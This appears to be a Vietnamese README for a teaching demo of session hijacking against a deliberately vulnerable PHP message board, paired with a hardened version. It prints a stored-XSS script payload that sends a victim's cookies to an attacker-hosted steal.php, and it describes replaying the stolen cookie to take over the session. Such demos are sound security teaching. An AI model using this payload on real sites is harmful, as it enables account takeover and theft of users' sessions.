Dự Án Demo Session Hijacking
Dự án này mô phỏng tấn công Session Hijacking trên ứng dụng web PHP đơn giản, kèm theo phiên bản bảo mật để thể hiện cách phòng chống. Repository bao gồm 5 file:

index.php - Web cơ bản với đăng nhập và đăng tin nhắn.
messages.json - Lưu tin nhắn (mặc định rỗng).
steal.php - Script giả lập hacker để đánh cắp cookie.
stolen_cookies.txt - Lưu cookie bị đánh cắp (mặc định rỗng).
protectionmethod.php - Phiên bản bảo mật của index.php.
Yêu Cầu
XAMPP: Chạy server cục bộ.
Hai máy hoặc hai trình duyệt: Mô phỏng nạn nhân và hacker.
Trình duyệt: Chrome, Firefox, v.v.
Cài Đặt
Cài XAMPP:
Tải XAMPP từ apachefriends.org và cài vào C:\xampp.
Chuẩn bị file:
Tạo thư mục (ví dụ: session-demo) trong C:\xampp\htdocs\.
Copy index.php, messages.json, protectionmethod.php vào thư mục này.
Đặt steal.php và stolen_cookies.txt vào thư mục khác (ví dụ: C:\xampp\htdocs\attacker).
Khởi động server:
Mở XAMPP Control Panel, nhấn Start cho Apache.
Truy cập web:
Mở trình duyệt, vào: http://localhost/session-demo/index.php.
Sử Dụng
Đăng Nhập
Truy cập http://localhost/session-demo/index.php.
Đăng nhập bằng tài khoản trong index.php:
user1/securepass, user2/user2pass, hoặc admin/password123.
Mô Phỏng Dự Án
Các Bước Thực Hiện
Hacker (user1):
Đăng nhập bằng user1/securepass tại http://localhost/session-demo/index.php.
Đăng tin nhắn chứa script độc hại (kích hoạt steal.php):

<script>window.location="http://localhost:8080/attacker/steal.php?cookie="+document.cookie;</script>
Nạn nhân (user2):
Đăng nhập bằng user2/user2pass.
Nhấn vào tin nhắn của user1 để xem nội dung.
Script chạy, cookie của user2 được gửi tới steal.php.
Hacker kiểm tra:
Mở stolen_cookies.txt trên máy hacker để lấy cookie của user2.
Dùng cookie này trong trình duyệt (F12 > Application > Cookies) để truy cập session của user2 mà không cần mật khẩu.
Demo Trên Hai Máy
Máy nạn nhân: Chạy index.php tại http://<ip-nạn-nhân>/session-demo/index.php.
Máy hacker: Chạy steal.php tại http://<ip-hacker>/attacker/steal.php.
Phiên Bản Bảo Mật
Thay index.php bằng protectionmethod.php, truy cập lại và thử tấn công. Tấn công sẽ thất bại do cookie được bảo vệ.
Mô Tả File
index.php: Web dễ bị tấn công.
messages.json: Lưu tin nhắn.
steal.php: Script đánh cắp cookie.
stolen_cookies.txt: Lưu cookie bị đánh cắp.
protectionmethod.php: Web đã cải tiến bảo mật.
Cải Tiến Bảo Mật (protectionmethod.php)
Cookie có thuộc tính HttpOnly và Secure.
Tái tạo session ID sau khi đăng nhập.
Mật khẩu được mã hóa.
